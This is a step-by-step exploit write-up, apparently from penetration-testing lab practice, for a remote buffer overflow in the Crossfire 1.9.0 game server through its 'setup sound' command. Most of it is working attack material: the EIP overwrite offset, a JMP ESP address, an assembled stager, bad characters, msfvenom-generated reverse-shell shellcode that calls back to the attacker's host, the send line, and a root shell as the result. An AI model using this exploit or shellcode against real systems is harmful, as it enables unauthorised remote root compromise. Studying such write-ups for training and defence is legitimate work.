# Crossfire 1.9.0
Reference: https://www.exploit-db.com/exploits/1582  
  
Crossfire 1.9.0 is vulnerable to a remote buffer overflow when providing 4000+ characters as a parameter to the "setup sound" command. To exploit this I used Evans Debugger (EDB).
  
## Exploitation

### 1. Control EIP
EIP crash position is dependant on the length of the provided input. The provided input length should remain at 4379.
Ensuring this, EIP is overwritten at position 4368.

### 2. Find instruction
In EDB, a JMP ESP instruction can be found at using the plugin "OpCodeSearcher". An instruction is found at `0x08134596`.

### 3. Create stager
Due to the ESP position at the time of the crash, only 7 bytes are left for any payload at the ESP position. This limitation means the shellcode must be placed elsewhere in the buffer and jumped to.  
- At the time of the crash, EAX points to the start of the input buffer.  
- Therefore, use the remaining space to increment EAX to a safe location in the offset characters and then jump into it.  
Instructions are as follows:
```bash
┌──(kali㉿kali)-[192.168.119.141]-[~/…/pwk/scripts/bof/linux]
└─$ msf-nasm_shell                                                                                                      
nasm > add eax,12
00000000  83C00C            add eax,byte +0xc
nasm > jmp eax
00000000  FFE0              jmp eax
```

Exploit is now structured as [setup sound][OFFSET (EAX)][JMP ESP][ADD EAX, 12][JMP EAX]  

### 3. Find bad characters
Bad characters discovered: `00` and `20`.

### 4. Generate shellcode
```bash
┌──(kali㉿kali)-[192.168.119.141]-[~/…/pwk/scripts/bof/linux]
└─$ msfvenom --arch x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=192.168.119.141 LPORT=80 -b '\x00\x20' -f python                                                                                             2 ⨯
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of python file: 479 bytes
buf =  b""
buf += b"\xd9\xcd\xb8\x0c\xba\xf6\x28\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x12\x31\x43\x17\x03\x43\x17\x83\xe7\x46\x14"
buf += b"\xdd\xc6\x6d\x2e\xfd\x7b\xd1\x82\x68\x79\x5c\xc5\xdd"
buf += b"\x1b\x93\x86\x8d\xba\x9b\xb8\x7c\xbc\x95\xbf\x87\xd4"
buf += b"\xe5\xe8\x0f\xa9\x8e\xea\xef\xb1\x1e\x62\x0e\x01\xf8"
buf += b"\x24\x80\x32\xb6\xc6\xab\x55\x75\x48\xf9\xfd\xe8\x66"
buf += b"\x8d\x95\x9c\x57\x5e\x07\x34\x21\x43\x95\x95\xb8\x65"
buf += b"\xa9\x11\x76\xe5"
```
To this payload, add a 32 byte NOPsled.
```python
io.sendline('\x11(setup sound ' + buf + 'A' * (4368-len(buf)) + eip + addeax + jmpeax + '\x90' * 2 + '\x90\x00#')
```

### 5. Exploit
Run the exploit.
```bash
┌──(kali㉿kali)-[192.168.119.141]-[~/…/pwk/scripts/bof/linux]
└─$ ./exploit.py
[+] Opening connection to 192.168.141.44 on port 13327: Done
[*] \x00
[*] Closed connection to 192.168.141.44 port 13327
```
Get a shell.
```shell
whoami
root
```
